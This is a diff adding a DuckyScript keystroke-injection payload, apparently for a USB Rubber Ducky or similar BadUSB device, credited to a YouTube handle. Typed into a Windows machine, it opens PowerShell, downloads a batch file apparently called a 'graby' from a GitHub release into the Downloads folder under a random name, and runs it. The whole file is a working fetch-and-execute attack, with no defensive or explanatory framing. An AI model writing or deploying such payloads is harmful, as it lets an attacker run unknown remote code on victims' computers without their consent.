@@ -1,0 +1,23 @@
+REM MADE BY @MISTEROFGAMES_YT 
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+STRING $filename = -join ((65..90) + (97..122) | Get-Random -Count 8) + '.bat'
+ENTER
+DELAY 500
+
+STRING $filepath = "$env:USERPROFILE\Downloads\$filename"
+ENTER
+DELAY 500
+
+STRING Invoke-WebRequest -Uri "https://github.com/test123311/test-repository/releases/download/fuck-you/mog-graby.bat" -OutFile $filepath
+ENTER
+DELAY 2000
+
+STRING Start-Process $filepath
+ENTER
